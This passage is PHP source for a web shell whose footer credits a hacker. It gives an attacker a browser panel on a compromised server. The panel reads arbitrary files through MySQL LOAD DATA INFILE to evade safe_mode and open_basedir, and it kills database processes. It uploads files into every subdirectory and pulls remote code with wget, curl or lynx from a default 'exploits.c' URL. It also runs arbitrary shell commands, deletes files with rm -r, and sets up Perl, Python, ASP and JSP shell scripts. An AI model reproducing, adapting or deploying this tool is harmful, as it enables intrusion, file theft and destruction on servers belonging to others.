<input type="submit" value="Create" class="inputzbut">
</form>
</td>
<td style="border:1px solid #333333;padding:3px;"><b>View File:</b>
<form action="'.$surl.'">
<input type="hidden" name="x" value="sql">
<input type="hidden" name="sql_x" value="getfile">
<input type="hidden" name="sql_login" value="'.htmlspecialchars($sql_login).'">
<input type="hidden" name="sql_passwd" value="'.htmlspecialchars($sql_passwd).'">
<input type="hidden" name="sql_server" value="'.htmlspecialchars($sql_server).'">
<input type="hidden" name="sql_port" value="'.htmlspecialchars($sql_port).'">
<input type="text" name="sql_getfile" size="30" value="'.htmlspecialchars($sql_getfile).'" class="inputz">
<input type="submit" value="Get" class="inputzbut">
</form>
</td>
</tr>
</table>';
          }
          if(!empty($sql_x)) {
            echo "<hr size=\"1\" noshade>";
            if($sql_x=="newdb") {
              echo "<b>";
              if((mysql_create_db($sql_newdb))and(!empty($sql_newdb))) {
                echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br/>";
              }
              else {
                echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br/>Reason:</b> ".mysql_smarterror();
              }
            }
            if($sql_x=="serverstatus") {
              $result=mysql_query("SHOW STATUS",$sql_sock);
              echo "<center><b>Server status variables:</b><br/><br/>";
              echo "<table class='tub'><th><b>Name</b></th><th><b>Value</b></th></tr>";
              while($row=mysql_fetch_array($result,MYSQL_NUM)) {
                echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";
              }
              echo "</table></center>";
              mysql_free_result($result);
            }
            if($sql_x=="servervars") {
              $result=mysql_query("SHOW VARIABLES",$sql_sock);
              echo "<center><b>Server variables:</b><br/><br/>";
              echo "<table class='tub'><th><b>Name</b></th><th><b>Value</b></th></tr>";
              while($row=mysql_fetch_array($result,MYSQL_NUM)) {
                echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";
              }
              echo "</table>";
              mysql_free_result($result);
            }
            if($sql_x=="processes") {
              if(!empty($kill)) {
                $query="KILL ".$kill.";";
                $result=mysql_query($query,$sql_sock);
                echo "<b>Process #".$kill." was killed.</b>";
              }
              $result=mysql_query("SHOW PROCESSLIST",$sql_sock);
              echo "<center><b>Processes:</b><br/><br/>";
              echo "<table class='tub'><th><b>ID</b></th><th><b>USER</b></th><th><b>HOST</b></th><th><b>DB</b></th><th><b>COMMAND</b></th><th><b>TIME</b></th><th><b>STATE</b></th><th><b>INFO</b></th><th><b>Action</b></th></tr>";
              while($row=mysql_fetch_array($result,MYSQL_NUM)) {
                echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td><td>".$row[2]."</td><td>".$row[3]."</td><td>".$row[4]."</td><td>".$row[5]."</td><td>".$row[6]."</td><td>".$row[7]."</td><td><a href=\"".$sql_surl."sql_x=processes&kill=".$row[0]."\"><u>Kill</u></a></td></tr>";
              }
              echo "</table>";
              mysql_free_result($result);
            }
            if($sql_x=="getfile") {
              $tmpdb=$sql_login."_tmpdb";
              $select=mysql_select_db($tmpdb);
              if(!$select) {
                mysql_create_db($tmpdb);
                $select=mysql_select_db($tmpdb);
                $created=!!$select;
              }
              if($select) {
                $created=FALSE;
                mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");
                mysql_query("LOAD DATA INFILE \"".addslashes($sql_getfile)."\" INTO TABLE tmp_file");
                $result=mysql_query("SELECT * FROM tmp_file;");
                if(!$result) {
                  echo "<b>Error in reading file (permision denied)!</b>";
                }
                else {
                  for($i=0;$i<mysql_num_fields($result);$i++) {
                    $name=mysql_field_name($result,$i);
                  }
                  $f="";
                  while($row=mysql_fetch_array($result,MYSQL_ASSOC)) {
                    $f.=join("\r\n",$row);
                  }
                  if(empty($f)) {
                    echo "<b>File \"".$sql_getfile."\" does not exists or empty!</b><br/>";
                  }
                  else {
                    echo "<b>File \"".$sql_getfile."\":</b><br/>".nl2br(htmlspecialchars($f))."<br/>";
                  }
                  mysql_free_result($result);
                  mysql_query("DROP TABLE tmp_file;");
                }
              }
              mysql_drop_db($tmpdb);
            }
          }
        }
      }
      echo '</td></tr>';
      if($sql_sock) {
        $affected=@mysql_affected_rows($sql_sock);
        if((!is_numeric($affected))or($affected<0)) {
          $affected=0;
        }
        echo "\t<tr><th colspan=2>Affected rows: $affected</th></tr>";
      }
      echo '</table>';
    }
    echo '</form>';
  }
}
elseif(isset($_GET['x'])&&($_GET['x']=='upload')) {
  if(isset($_POST['uploadcomp'])) {
    if(is_uploaded_file($_FILES['file']['tmp_name'])) {
      $path=magicboom($_POST['path']);
      $fname=$_FILES['file']['name'];
      $tmp_name=$_FILES['file']['tmp_name'];
      $pindah=$path.$fname;
      $stat=@move_uploaded_file($tmp_name,$pindah);
      $cp_filed=$_POST['cp_filed'];
      if($stat) {
        if(isset($cp_filed)) {
          $dir_open=opendir('.');
          while(false!==($filename=readdir($dir_open))) {
            if($filename!="."&&$filename!="..") {
              if(is_dir($filename)) {
                $link=$filename;
                copy($pindah,$path.$link."/".$fname);
              }
            }
          }
          closedir($dir_open);
        }
        $msg="<br/>File Uploaded To <span class='gaya'>$pindah</span>";
      }
      else 
        $msg="<br/>Failed To Upload <span class='guyu'>$fname</span>";
    }
    else 
      $msg="<br/>Failed To Upload <span class='guyu'>$fname</span>";
  }
  elseif(isset($_POST['uploadurl'])) {
    $pilihan=trim($_POST['pilihan']);
    $wurl=trim($_POST['wurl']);
    $path=magicboom($_POST['path']);
    $namafile=download($pilihan,$wurl);
    $pindah=$path.$namafile;
    if(is_file($pindah)) {
      $msg="<br/>File Uploaded To <span class='gaya'>$pindah</span>";
    }
    else 
      $msg="<br/>Failed To Upload <span class='guyu'>$namafile</span>";
  }
  ?>
<form action="?y=<?php echo $pwd;?>&amp;x=upload" enctype="multipart/form-data" method="post" style="-webkit-margin-before:35px;">
<table class="tabnet" style="width:325px;"><tr><th colspan="2">Upload From Computer</th></tr><tr><tr><td colspan="2" align="center"><input class="inputz" type="file" name="file" style="width:100%;" /></td></tr><tr><td><input type="checkbox" name="cp_filed" /> Copy To All Sub Directories</td><td><input type="submit" name="uploadcomp" class="inputzbut" value="Go !" style="width:80px;"></td></tr><tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd;?>" /></td></tr></tr></table></form><table class="tabnet" style="width:32px;"><tr><th colspan="2">Upload From Url</th></tr><tr><td colspan="2"><form method="post" style="margin:0;padding:0;" actions="?y=<?php echo $pwd;?>&amp;x=upload"><table><tr><td>URL</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="http://www.some-code/exploits.c"></td></tr><tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd;?>" /></td></tr><tr><td><select size="1" class="inputz" name="pilihan"><option value="wwget">wget</option><option value="wlynx">lynx</option><option value="wfread">fread</option><option value="wfetch">fetch</option><option value="wlinks">links</option><option value="wget">GET</option><option value="wcurl">curl</option></select></td><td colspan="2"><input type="submit" name="uploadurl" class="inputzbut" value="Go !" style="width:246px;"></td></tr></form></table></td></tr></table><div style="text-align:center;margin:2px;"><?php echo $msg;?></div>
<?php
}
elseif(isset($_GET['x'])&&($_GET['x']=='shell')) {?>
<form action="?y=<?php echo $pwd;?>&amp;x=shell" method="post" style="-webkit-margin-before:20px;"><br/><table class="cmdbox"><tr><td colspan="2"><textarea class="output" readonly>
<?php
if(isset($_POST['submitcmd'])) {
    echo @exe($_POST['cmd']);
  }
  ?>
</textarea><tr><td colspan="2"><?php echo $prompt;?><input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" /><input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:12%;" /></td></tr></table>
<?php
}
else {
  if(isset($_GET['delete'])&&($_GET['delete']!="")) {
    $file=$_GET['delete'];
    @unlink($file);
  }
  elseif(isset($_GET['fdelete'])&&($_GET['fdelete']!="")) {
    if(@exe("ls -a ".$_GET['fdelete'])) {
      @exe("rm -r ".$_GET['fdelete']);
    }
    else 
      $dir=$_GET['fdelete'];
    delTree($dir);
  }
  elseif(isset($_GET['mkdir'])&&($_GET['mkdir']!="")) {
    $path=$pwd.$_GET['mkdir'];
    @mkdir($path);
  }
  $buff=showdir($pwd,$prompt);
  echo $buff;
}
?>
<script language='javascript'>
function checkAll(bx){
var cbs = document.getElementsByTagName('input');
for(var i=0; i < cbs.length; i++){
if(cbs[i].type == 'checkbox' && cbs[i].name != 'dis'){
cbs[i].checked = bx.checked;
var c = cbs[i].parentElement.parentElement;
if(cbs[i].checked) c.className = 'cbox_selected';
else c.className = '';
}
}
}
function hilite(el){
var c = el.parentElement.parentElement;
if(el.checked) c.className = 'cbox_selected';
else c.className = '';
}
function optionCheck(){
var option = document.getElementById("options").value;
if(option == "pl"){
document.getElementById("wow").value = "shell.pl";
}
if(option == "py"){
document.getElementById("wow").value = "shell.py";
}
if(option == "asp"){
document.getElementById("wow").value = "shell.asp";
}
if(option == "aspx"){
document.getElementById("wow").value = "shell.aspx";
}
if(option == "jsp"){
document.getElementById("wow").value = "shell.jsp";
}
}
setInterval(ganti, 100);
function ganti(){
var isi = document.getElementById("portname").value;
var wew = document.getElementById("aisi");
wew.innerHTML = "http://<?php echo $server_ip;?>:"+isi;
wew.href = "http://<?php echo $server_ip;?>:"+isi;
}
function ubah(){
var sebelum = document.getElementById("upfile").value;
var sesudah = document.getElementById("namefile");
sesudah.value = sebelum.split(/[\\/]/).pop();;
}
</script>
<?php
echo $jsc;
?>
<center>
<div id="spoiler" style="display:none;">
<form action="?y=<?php echo $pwd;?>" enctype="multipart/form-data" method="post"><table class="tabnet" style="width:325px;"><tr><th colspan="2">Upload From Computer</th></tr><tr><tr><td colspan="2" align="center"><input class="inputz" type="file" name="file" id="upfile" style="width:100%;" onchange="ubah()" /></td></tr><tr><td width="70px">&nbsp; New Name : </td><td><input class="inputz" type="text" name="namefile" id="namefile" style="width:100%;" /></td></tr><tr><td colspan="2"><input type="checkbox" name="cp_files" /> Copy To All Sub Directories <span style="float:right;"><input type="submit" name="uploadcomps" class="inputzbut" value="Go !" style="width:80px;"></span></td></tr><tr><td colspan="2"><input type="text" class="inputz" style="width:100%;" name="path" value="<?php echo $pwd;?>" /></td></tr></tr></table></form>
<?php
if(isset($_POST['uploadcomps'])) {
  if(is_uploaded_file($_FILES['file']['tmp_name'])) {
    $path=magicboom($_POST['path']);
    $fname=$_FILES['file']['name'];
    $tmp_name=$_FILES['file']['tmp_name'];
    $newfname=$_POST['namefile'];
    $pindah=$path.$newfname;
    $stat=@move_uploaded_file($tmp_name,$pindah);
    $cp_files=$_POST['cp_files'];
    if($stat) {
      if(isset($cp_files)) {
        $dir_open=opendir('.');
        while(false!==($filename=readdir($dir_open))) {
          if($filename!="."&&$filename!="..") {
            if(is_dir($filename)) {
              $link=$filename;
              copy($pindah,$path.$link."/".$fname);
            }
          }
        }
        closedir($dir_open);
      }
      echo "<script language='javascript'>
alert('File Uploaded To $pindah');
window.location.href = '?y=$pwd';
</script>";
    }
    else {
      echo "<script language='javascript'>
alert('Failed To Upload $fname');
window.location.href = '?y=$pwd';
</script>";
    }
  }
  else {
    echo "<script language='javascript'>
alert('Failed To Upload $fname');
window.location.href = '?y=$pwd';
</script>";
  }
}
?>
</div>
<br/>
<div class="footer"><div class="info">[ Shell By <a href="http://www.alanz.co.de/search/?q=Hacked+By+S4MP4H" target="_blank"><span class="gaya"><? echo $xName;?></span></a> ]</div><div class="jaya">Allright Reserved &copy; <?php echo date("Y",time())." ".$xName;?></div></div></center></script></div></body></html>
